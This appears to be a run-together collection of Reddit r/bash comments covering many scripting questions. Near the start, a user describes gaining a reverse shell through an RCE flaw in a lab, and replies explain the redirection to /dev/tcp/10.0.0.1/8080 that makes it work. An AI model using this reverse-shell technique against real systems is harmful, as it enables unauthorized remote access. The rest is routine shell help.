Fantastic. This is exactly what I needed. In terms of it not looking safe, you're right. It's definitely not and only done in my little lab environment. Thanks a ton for the explanation. 
yep in this case I was experimenting with RCE vuln and found appending that bash statement got me a reverse shell. Worked really well but I didn't 100% understand the statement I sent. 
Woah, can you explain what the &lt;&lt; and &gt;&gt; are doing here? I know they direct IO but don't see that here. Also, would mine $1 $2 work?
Sorry, it is supposed to be double quotes. But my phone wont let me do it properly... :-/
Your example `ethminer` command has `eth.pool.minergate.com:45791`, but you said you ran ./mine.sh with `eth.pool.etc`, and the error message has `http://eth.pool.minergate.com:4579`. So it's really hard to tell what might be going wrong. Can you try running both `ethminer` and your script again, making sure to use exactly the same values? 95% of the time, when you are expanding a variable (e.g., `$foo` or `$1`), you should surround the variable with double quotes (e.g., `"$foo"` or `"$1"`). This is because Bash does several different transformation steps to turn what you typed into the actual command that is executed. Replacing variables with their values is one of these steps, and it is possible for the steps that follow to then make changes to those values (for example, if your variable's value happens to contain a `*`, then Bash will treat that as a glob and try to expand it into a list of filenames, unless you surround the variable with double quotes when you use it). Given the parameter values you are using, the quoting is not required, but it's still a good idea to get in the habit of doing it: ./ethminer -G -S "$1" -O "$2" If you're still having trouble, it might help to change the `./ethminer ...` line to `echo ./etherminer ...` (i.e., just print everything instead of running it) so you can make sure the command being run is what you expect.
The port in the error message doesn't match the port in your first call. Does the script work if you just have the line you are trying to run and no function call? You might want to add a `cd "$( dirname "$0")"` to the top of your script so you know you are in the correct directory. If you call ethminer with a hostname of example.com what error do you get?
Ah dang. Thought it would be easy. ;) If you’re passing the exact args to ethminer as you are to your mine script then it *should* work. There’s nothing in bash or anything that should change anything unless the script itself is doing something wrong. You could try adding a line `set -x` to your script (right before you call ethminer) which will tell bash to print out everything it’s running and may help hilight what’s wrong, but this is so simple I’m not sure if it’ll show you anything you don’t know. But it might not hurt to try it. 
&gt; &gt;&amp; means redirect a file descriptor (by default stdout or file descriptor 1) to another file descriptor. Important distinction: `&gt;&amp;` means redirect to a file descriptor *if the word following it is a number*. If not, it means the same thing as `&amp;&gt;`, which is equivalent to `2&gt;&amp;1 1&gt;`. That's the sense in which it's being used here -- to redirect `stdout` and `stderr` to the file `/dev/tcp/10.0.0.1/8080` (which is actually not a real file, but it's the same idea). I think the `&gt;&amp;` syntax for `2&gt;&amp;1 1&gt;` was borrowed from csh. I would avoid it personally because it's super confusing.
&gt; 2&gt;&amp;1 1&gt; Do you mean *1&gt; /dev/tcp/10.0.0.1/8080 2&gt;&amp;1*? *2&gt;&amp;1 1&gt;/dev/tcp/10.0.0.1/8080* would be different.
Yeah, sorry. Edited
That was a great write up. The 0 is new to me, thanks. 
As you can see from this thread, people with bash experience still get confused quite a lot, and there's always something more to learn. I learnt about *&amp;&gt;*.
Sorry lol i put etc because I got lazy and didn't write out the rest but it's the same exact port
Sorry lol i put etc because I got lazy and didn't write out the rest but it's the same exact port
the script now is: GNU nano 2.0.6 File: mine.sh #!/bin/bash mine(){ ./ethminer -G -S "$1" -O "$2" } mine "$1" "$2" both with an without " ", on either or both, the same error occurs :(
So I did the echo line you said, and it is the EXACT same line I run for the correct result; when I copy and paste the returned line, the error still occurs. Is this something to do with characters, I am clueless at this point...
Can you do all of this over again without being lazy? It's really hard to help you if you won't post the actual script, input, and output verbatim.
The statement in curly braces may need a terminating semi-colon. &gt; mine(){ ./ethminer -G -S "$1" -O "$2" } mine(){ ./ethminer -G -S "$1" -O "$2"; }
Are you on a Mac? Macs have stupid weirdo quotes, I've run into bizarre errors as a result before, particular when copying a command from a Note or something. So you might be on to something with the characters. If you aren't typing the command from scratch already be sure to try that (e.g. You're copy pasting the URL or something). Probably a long shot but might be something weird like that.
The cut command won't handle files with spaces in their name. Maybe use sed instead e.g. sed 's/^[^ ] //' or just replace the whole line with lmfile=$(ls -t | head -1) You're more likely to find files with spaces in their names, than new line characters in their names.
This function is leaking environment variables i.e. after it's been run, the variables will still be in the session. Declare them to limit their scope e.g. declare lmfile lmfile=...
Fixed it.
Dude, that helped me out a lot, thanks!
Would help to know which parts you already know how to do, and which parts you are wondering about ... Anyway. To read in the input, use `read -r`, in a loop if there are multiple lines. See [BashFAQ 1](http://mywiki.wooledge.org/BashFAQ/001). You can iterate the characters of a string with for (( i = 0; i &lt; ${#string}; ++i )); do printf 'Processing character %q\n' "${string:i:1}" done An associative array is useful to do the counting. It must be declared with `declare -A count`, then use `(( 'count[$char]++' ))` to increment the value for each char. See [BashFAQ 5](http://mywiki.wooledge.org/BashFAQ/005) on how to use arrays.
`ent -c` may be useful. http://manpages.ubuntu.com/manpages/xenial/man1/ent.1.html
This is the right answer. Some code that should work in a script (you can easily replace the input variable for read or whatever): input="$@" max="${#input}" for (( i=0; i&lt;$max; i++ )); do same=1 next="true" #checks if the letter was already processed, if so marks the variable as false for z in "${processed[@]}"; do if [ "$z" = "${input:$i:1}" ]; then next="false" break fi done #if the letter was not processed yet then count if [ "$next" = "true" ]; then for (( j="$((i + 1))"; j&lt;$max; j++ )); do if [[ "$i" -ne "$j" &amp;&amp; "${input:$i:1}" == "${input:$j:1}" ]]; then same=$((same + 1)) fi done processed+=(${input:$i:1}) echo "${input:$i:1}: $same" fi done 
Accepting No by default: echo -n "$1: [y/N]" read REPLY echo "" # (optional) move to a new line if [[ $REPLY =~ ^[Yy]$ ]]; then installation command fi Accepting Yes by default: echo -n "$1: [Y/n]" read REPLY echo "" # (optional) move to a new line if [[ $REPLY =~ ^[Nn]$ ]]; then installation command fi 
Here is a quick and dirty one-liner: printf "Hello friend!" | sed -e 's/./&amp;\n/g' | sort | uniq -c If you need exact same output you have, send it to the another sed: printf "Hello friend!" | sed -e 's/./&amp;\n/g' | sort | uniq -c | sed 's/ *\([0-9]*\) \(.\)/\U\2: \1/' 
Not a very neat solution, but seems to work echo 'Hello friend!' | { read string; echo $string; echo ${string^^} | sed 's/./&amp;\n/g;s/\n$//;s/[[:blank:]]\n//' | cat -n | sort -k2,2 | uniq -c -f1 | sed 's/ */\t/g' | sort -nk 2,2 | cut -f2,4 | sed 's/\(.*\)\t\(.*\)/\2: \1/'; }
* bind menu-complete to a key in ~/.inputrc. * `vim .` open the directory and select the file from vim. * `select a in *.txt; do vim "$a"; done` menu in bash.
You could do `ls` and then copy+paste the file name. If you still have problems, you can also make `ls` print names in a way that might help. Try one of the following: ls -Q ls --quoting-style=shell And then when you copy+paste, make sure to also catch the quote characters that are around the file names.
one quick way you could try would be this one-liner: select file in * ; do vim $file ; done it numbers and prints all filenames in the current directory and lets you pick a file by entering its number.
Thanks.
No problem!
I would recommend using Ansible to do all of these things in an idempotent fashion. 
Nice! Consider submitting this to [awesome bash](https://github.com/awesome-lists/awesome-bash). 
A bit of feedback. I'd recommend implementing some error checking in your scripts. Just briefly looking through you basically just listed a bunch of commands such as installing packages and manipulating files without actually checking if anything works. It might work on the first try on your system, but anyone else who tries to use some might end up with a lot of issues. The scripts are also Ubuntu specific, and require user interaction. Which is probably not what you want for something that is to be automated.
Style suggestion for your `sysinfo` script... Instead of having multiple commands like this: command1 &gt;&gt; somefile command2 &gt;&gt; somefile command3 &gt;&gt; somefile You can capture the lot instead like this: { command1 command2 command3 } &gt;&gt; somefile
Thanks! I didn't know you could do that. I am still new to bash scripting.
Thank you so much for the feedback! Yeah I do need to add in more error-checking. And yes, they are Ubuntu specific, so I should definitely put that in the readme for any script that is. And they do require user interaction, and that is because some of the scripts require unique values. But you're right in the sense that that is not truly automating.
Haven't used Ansible, I'll have to give it a try!
I'll probably make some edits based on the feedback I am getting and then if I feel like the scripts are in a good place, I will submit them.
DRY - Ansible will save you a metric fuckton of time. 
These scripts seem very specific to your machine, i.e. assuming things like application version.
Yeah, I worked hard to make them generic, but I guess I wasn't totally successful.
It only matches the first occurrence. I cannot check to be sure, but I am certain you just have to add a g at the end, after the last /. But also what the other person said, parsing html with regexp takes you to the dark side
OK. The problems are: 0. Don't use regex to parse HTML, lest you wake an unspeakable elder god from his eternal slumber. 1. The sed commands you pasted are not the sed commands that actually give the output you pasted, since in the output you are replacing with X and in the commands you are replacing with nothing. 2. The commands as written don't work at all because you're replacing `hello` tags, not `title` tags. 3. Broadly speaking your regex is correct, but you forgot the closing `g`, which is why the first match is being replaced, but not the second match. 4. To avoid leaning toothpick syndrome, if you're working with a pattern which contains forward slashes, use some other character as the regex delimiter, like a pipe or a hash. Then you don't need to escape the forward slashes. In summary, `sed -r 's#&lt;/?title&gt;##g' test.html` strips out the tags entirely, and `sed -r 's#&lt;/?title&gt;#X#g' test.html` replaces them with `X`.
Oh my g. Forgot about that.
You're missing the *g* option on the substitution, so the substitution is only matching the first instance on the line. Try something like *sed 's/&lt;[^&gt;]*&gt;//g'*. There are endless problems with trying to parse HTML with regex e.g. * Coalescing whitespace. * Multiline tags. * Special rules for unescaped characters. If you're trying to convert HTML to plain text, there are better options: [https://stackoverflow.com/a/12423133](https://stackoverflow.com/a/12423133).
2,3,4 - Okay, I need coffee. 5 - TIL you could do that. Thank you
 echo -e "FirstLine:SecondLine\nThirdLine:FourthLine"| awk '{if(getline a){printf "%s %s\n",$0,a}else{printf "%s\n",$0}}' 
The lookup table can be replaced with ord () { LC_CTYPE=C printf '%d' "'$1" } ([https://unix.stackexchange.com/a/92448](https://unix.stackexchange.com/a/92448)).
It might be faster to use an integer as a temporary variable instead of an array and do the shifting and adding for each byte instead of at the end.
The notation `{0..3}` is expanded into an array. It might be faster to use a for statement with a counter that increments.
Errors are not handled e.g. the error code if read is ignored, and initialising variables in their declaration hides errors (the exit code of `declare foo=$(false)` is 0).
`if [ -z "$byte" ]; then`... can be replaced with `${byte:-0}`.
yeah i tried that command and it gave me the "&gt;" line. I am using gitbash for the CLI. Is there a different way to format it?
here is what I meant Line 1 Line 2 Line 3 Line 4 Thats what I have What I want to do is Line 1:Line 2 Line 3:Line 4 That is what I would like to see.But I think that reddit is reformatting what I want to do 
Huh, I never knew that.
 #! /bin/bash input_file=$@ x=0 y=1 #there is a placeholder, and we use that to swap the value of x and y program(){ while read line do if [ $x == 0 ] then echo -n $line else echo $line fi #swap value of x and y placeholder=$x x=$y y=$placeholder done }&lt;$input_file program $* 
if it were line1:line2:line3 line4:line5:line6 we could use , three variables, x , y, z and swap their values in each loop. if it were say 10 lines or 20 lines , we could use a list or array list=(0 1 2 3 4 5 6 and so on ) and use pop and push functionality to change the elements of the array in each loop. so after n loops it would trigger.
You crazy, crazy individual. Love it!
That's... Not what this sub is
So click it into the correct sub
That's not even close to how Reddit works.
Don't worry, once one of the mods sees it, it will be "clicked into" the correct place.
Will this work for files with more than 1024 columns?
Any that don't require libreoffice that you know of?
Yes. I wanted make my own as an exercise.
Sure, so I've used two that don't require libreoffice. From memory the main one used was this one: https://github.com/dilshod/xlsx2csv And there's a bash one mentioned there that is currently inaccessible. I hunted that down somewhere - dug up some repo/mirror of the author's work. I can't be bothered logging into work to grab it, so you can see Archive.org's snapshot here (it may differ from the version I found/used - YMMV): https://pastebin.com/8kji9wwb
Great variability! I was just upgrading a lot... for i in {0..100}; do echo $i | dialog --gauge "Upgrade in progress" 10 70 0; sleep 1; done
there is ssconvert which uses Gnumeric, so technically...
Files of that size or bigger are quite common. LO stops at 1024, excel stops at 16384. I was just curious if LO would support bigger sizes on the command line.
 awk '{ if (NR % 2) { delimiter=":" } else { delimiter="\n" } printf "%s%s", $0, delimiter }' 
Translated into English, it does this: If variable $post_data has no content, then assign the text "{}" to the variable $post_data.
That's what I needed thanks. 
What does the `&amp;&amp;` do?
Thanks ! It's working perfectly at this web hosting : http://onsale.jaguarpc.com/
But why??? Why not set your DHCP reservation to hand out the address you want?
If you're set on doing this in Bash, you could have a look at [`bc`](https://www.gnu.org/software/bc/manual/html_mono/bc.html) for handling the calculations and [`jq`](https://stedolan.github.io/jq/tutorial/) for parsing the JSON data. However, if you think the script might grow to a considerable size, I'd recommend using Python. For the HTTP request, you could use [`requests`](http://docs.python-requests.org/en/master/). The JSON parsing is part of the standard library and there is also a mathematic module available too if you need it. Sorry if that doesn't answer your questions.
Thanks! But does not commands usually return numbers? Are Numbers truthy/falsy in bash?
It's a convoluted way of doing : "${post_data:-'{}'}"
&gt; What I would like this script to do is to record X number of values based on the epoch time and give me the delta for price every 5, 15, 30, 60 minutes plus every 12 hours and 24 hours. I would solve this with cron. You can edit the crontab with: crontab -e There insert something like: #minute hour day month day-of-week */5 * * * * script_path filename1 */15 * * * * script_path filename2 */30 * * * * script_path filename3 1 * * * * script_path filename1 1 */12 * * * script_path filename4 1 1 * * * script_path filename5 So in your script you get the filenameX in the variable $1, then you can redirect your output there and then you can easily compare values at anytime, with for example: G=12.6; L=10; if [ $(bc -l &lt;&lt;&lt; "($G / $L)&gt;1.25") -eq 1 ]; then echo "Greater by more than a 25%"; fi So you need to read and store in separate files and perform calculations and comparisons. I would first make sure this is working for one of the options (like the 5m) and then just adapt it.
I'm definitely not set on doing it in bash. I could see a way to glue built-ins together to get what I wanted for the first step, so I went that way. I'm completely new at this type of coding. I knew I could lean on sed, grep, etc without much trouble although it turned into quite a bit more than I expected. Python is driving me nuts but I remember how much I hated the shell built-ins when I was first getting to know them too. This seems like a pretty steep hill to climb to first get to know python, but I'm up for it. Thanks for the suggestion for the timers. I avoid cron if it all possible :) I'm really familiar with systemd but I haven't used the timers yet. I'll check them out! 
Thank you for laying out how to do it in crontab. I"m going to check out systemd-timers but I will use this as a reference if that doesn't work out. I'm trying to avoid winding up with a pile of scripts, but that may be the way to go with the way I know how to work with the shell right now. As /u/haskell-enthusiast suggested, I'm probably going to force myself to stop doing it in bash and force myself to finally learn python. 
If there were always a DHCP server available, I would do that. Since you asked for more info, hopefully, you'll help out. I have a laptop that is 3 hours away. The folks that move it for me are Windows users. Occasionally, I need the laptop moved, and instead of having to be there to reconfigure it when it is, I would like a script that can detect the connection and change IP information accordingly.
The problem is the quotes that stop the glob from expanding. But it's probably better to use find. find $folder -name "*.ext" -delete
How about using find instead? This wouldn't require a loop like you have. find /path/to/top/dir -type f -name "*.ext" -exec rm -f {} \; -type f (files only) -name "*.ext" (anything ending in .ext)
Not as compact as a cheat sheet. Haven't looked at it in depth yet, but so far, it looks great!
I plan on making a 2 page Bash cheat sheet as an appendix on the last page!! :D
Wow this is great resource, thank you for this! 
Thanks mate, it took 2 months to compile the content to PDF :D
The .xlsx was provided by some other user who uses Windows and is in a non-technical role. I use Linux on my machine.
Run this in the folder you want to delete's directory: #!/bin/bash for names in $(ls) do rm $names done *It will delete all files withing that directory
For multiple directories using find, using my earlier example, use the following: find dir1 dir2 dir3 -type f -name "*.ext" -exec rm -f {} \;
Very useful. Thank you!
The way I taught myself shell was to do everything offline, and look up examples or read theory in a dead tree book (the dated but easy [BASH Bible](https://www.amazon.com/Linux-Command-Shell-Scripting-Second/dp/1118004426)). Otherwise, I would have ended up on stackoverflow and not learned anything. Whether you go for shell, python, perl(6), or Go, Dart, assembly or a C language, you won't learn anything until you start solving your own problems. (Like doing maths in school.) If you want to work with Linux, shell scripts and the UNIX tools are ubiquitous. If you want to learn scripting in general, bash, powershell, python and perl are popular. If you want to change path and learn programming, learning a C language (C, C++, etc.) or even assembly could be interesting (I am not a programmer, as you probably understood already). The benefit of python (and perl) over BASH is the huge library of modules. BASH is my personal favorite, but I do a lot of it. My point is simply this: learning a scripting language requires a task and the will to solve it, without simply copying others. My advice is that you keep stumbling until you have something that works in its own right, and that you understand _how/why_ it works, and e.g. why some of the alternatives you'll find subsequently on stackoverflow are better/worse/irrelevant.
Okay got ya... This seems doable. The way I would do this is by setting up a cron job that pings 8.8.8.8 every few minutes and if it fails cycle through the configurations you want to try and restart network manger or bounce the port. This link will show you how to change the ip via the cli. https://www.howtogeek.com/118337/stupid-geek-tricks-change-your-ip-address-from-the-command-line-in-linux/ I wouldn't change the dns server everytime just keep using 8.8.8.8. hope this helps.
Excellent! Now all I need is something similar for `tmux` and `LaTeX`!
Hi wertperch, thanks for the compliment! :D I have something similar for `LaTeX`: http://books.goalkicker.com/LaTeXBook/
Oh, I must go and look! Thus far my experience has been like ["Install LaTeX…write a doctoral thesis in cosmology"](https://new1.fjcdn.com/pictures/How_afe44a_1440266.jpg).
Haa very funny wertperch! :P
=]
That should be `: ${post_data:='{}'}`
Hey, we really appreciate all of this you made! How can I be notified for when you get to the perfect version? Thanks!
'history' does not work in scripts. It only works on the command line. If you want to do something with 'history', write a function for your ~/.bashrc instead of a script. About how to do that, you pretty much just take your literal script and surround it by `function_name () {` and `}` lines and add that to your ~/.bashrc. Inside that function, you might want to define your variables with 'local' so that they will not be visible outside of your function, meaning change your `lss=...` and `mr=...` lines like this: local lss=... local mr=...
I added the following lines to `.bashrc` # less or more lessMore(){ local lss=$(history | grep "less" | wc -l) local mr=$(history | grep "more" | wc -l) if [[ $lss -gt $mr ]]; then echo "You prefer less ($lss vs $mr)" else echo "You prefer more ($mr vs $lss)" fi } It still doesn't work. If I do`lessMore()` in the command line, it waits for input. What should I fix?
Thank you!
There are a few problems with trying to uniformly parse the output of `history` I suggest you try my `histrank()` function found [here](https://www.reddit.com/r/commandline/comments/621l7u/is_there_a_way_to_make_bashzsh_history_smarter/) Then you can grep the output of `histrank` By the way, if you're on Linux only, you can skip the `wc -l` and use `grep -c`
https://crontab.guru/ @reboot in crontab should work but it is non-standard and your distro implementation may not support it. 
Awesome! Thank you!!
I hadn't seen this one before: &gt; Section 49.1: Hello World. &gt; # create the co-process &gt; coproc bash &gt; # send a command to it (echo a) &gt; echo 'echo Hello World' &gt;&amp;"${COPROC[1]}" &gt; # read a line from its output &gt; read line &lt;&amp;"${COPROC[0]}" &gt; # show the line &gt; echo "$line" &gt; The output is "Hello World".
I didn't realize how much bash I knew until I read the table of contents. I must have individually searched and learned these things one at a time over years and years and didn't notice.. Great resource
I have converted tmux cheat sheet to ConTeXt: https://github.com/BruXy/tmux.md
Just found this post, the approach I use to write input variables, is to write them to a file, and then source that file. If you run the following script, you will see that it prints values on subsequent calls to the script. This can be handled better with a loop, and some checks that you are not just adding the same variable to the end of the file each time. #!/bin/bash VARIABLE_FILE="variables" if [ -f ${VARIABLE_FILE} ]; then source ${VARIABLE_FILE} else echo "#!/bin/bash" &gt; ${VARIABLE_FILE} fi echo "MY_VARIABLE4=$MY_VARIABLE4" echo "NEW_VARIABLE=$NEW_VARIABLE" function saveVariable() { if [ ${#} -eq 1 ]; then { #Save literal contents of variable. ( eg. COMPOUND=/home/user/desired/path ) echo ${1}=\"${!1}\" &gt;&gt; ${VARIABLE_FILE} } else { #Save variables to value indicated by remaining paramters. ( eg. COMPOUND=${HOME}/${PATH} ) #${!1}=\"${@:2}\" #echo ${1}=\"${@:2}\" \# ${!1} &gt;&gt; ${VARIABLE_FILE} echo ${1}=\"${@:2}\" \# $(eval "echo ${@:2}") &gt;&gt; ${VARIABLE_FILE} } fi } MY_VARIABLE1="My Value1" MY_VARIABLE2="My Value2" MY_VARIABLE3="My Value3" MY_VARIABLE4="My Value5" MY_VARIABLE5="My Value5" MY_VARIABLE6="My Value6" ANOTHER_VARIABLE="Another Value" saveVariable MY_VARIABLE1 saveVariable MY_VARIABLE2 saveVariable MY_VARIABLE3 saveVariable MY_VARIABLE4 saveVariable MY_VARIABLE5 saveVariable MY_VARIABLE6 saveVariable ANOTHER_VARIABLE saveVariable NEW_VARIABLE "\${MY_VARIABLE3}/\${MY_VARIABLE3}" #A coumpoud variable Check $VARIABLE_FILE, and the value will be commented next to it. 
Is this a new thing from you? I seem to remember it from a while back when I was first setting up tmux. I'm in the throes of making a script to launch a multi-window session with programs already set up. I really should spend an hour with this, and a notebook and pen. Oh, and thank you!
No, I have just forked the tmud.md repository and wrote that MD-&gt;ConTeXt conversion script.
It seems…familiar.
Oh yeah, got it to work. Thanks for the help. If I name the function `less` for instance, the builtin command runs instead. What allows this happen?
History is disabled by default in noninteractive shells. In a script you can instead just search in the history file. lss=$(grep -c less ~/.bash_history) mr=$(grep -c more ~/.bash_history) It is possible to enable history inside a script. But it's a bit messy, especially if you don't want the commands executed in the script itself to be saved in the bash history. #!/bin/bash HISTFILE=~/.bash_history HISTCONTROL=ignorespace # lines with leading space will not be stored in history set -o history # enables history lss=$(history | grep "less" | wc -l) # note leading space mr=$(history | grep "more" | wc -l) set +o history # disables history again if [[ $lss -gt $mr ]]; then echo "You prefer less ($lss vs $mr)" else echo "You prefer more ($mr vs $lss)" fi 
Or you can just quote the expansion, i.e. `"${command}"`. That will preserve the value properly, including newlines. (Also note the use of `cat` and a here-document is completely superfluous. It's faster and easier to simply assign a quoted multi-line value to the variable directly.)
Yes, you shouldn't name it the same as another command because you will replace the original one. Bash first looks at functions, then next at its "builtin" commands (for example 'cd', 'echo'), then last at the programs it can find in the locations listed in $PATH. That should be the order it uses to decide what to run when you type a command name. What might be interesting, bash has a command named 'command' that you can use to make it look at real commands instead of functions. If you have a function 'less' defined, then you can do this to run the real program: command less This can be interesting if you want to change the default parameters of some program in your bashrc, and what you want to do is too complicated for 'alias'. You can do this for example: ls() { command ls --color=auto "$@" } You need to use 'command' in this example here because without it the function would go into an infinite loop of calling itself and your bash would crash after a bit. This example isn't really good because it's too simple. It's the same as doing alias ls='ls --color=auto'
Well, you could replace just the . with: sed 's%\.%/home/user%g' sed will accept most anything as the delimiter, so just use @ or % or &amp; instead of / to make it easier to work with the /s in the path.
 sed -i s'%\.%/home\/user%'g testfile This should work. You have to remember to escape special characters. What this does is replace the period with /home/user globally throughout "testfile".
If you really need to include the full thing: sed 's@\./Plex\\ Media\\ Server@/home/user/Plex\\ Media\\ Server@g'
adding quotes to $command worked ! would have given you gold if I had money .
Thanks ! appreciate the response. 
Thank you.
Thanks this did the trick sed -i 's@\./Plex\\ Media\\ Server@/home/user/Plex\\ Media\\ Server@g' start.sh 
Thanks that was what I needed. I went with kittykarlmarx since I like the idea of using the whole string instead of just substituting out the period.
Try this: #!/bin/bash ipArray=( '10.192.47.0' '10.192.68.0' '10.192.54.0' ) for ip in "${ipArray[@]}" do echo "$ip" ssh -i '/Users/name/Documents/privatekey.pem' ec2-user@"$ip" &lt;&lt;'EOD' if grep string /usr/share/activemq/conf/jetty-realm.properties then echo updated echo ip &gt;&gt; goodamq.txt echo written to goodamq else echo noooooo echo ip &gt;&gt; badamq.txt echo written to baddamq fi EOD done 
I get this "Pseudo-terminal will not be allocated because stdin is not a terminal." it executes but still does not write to the file 
Have you googled that error message?
its not an error per say ; its kinda a warning , scripts still executes fully.
The file will be in the home directory of ec2-user on each machine.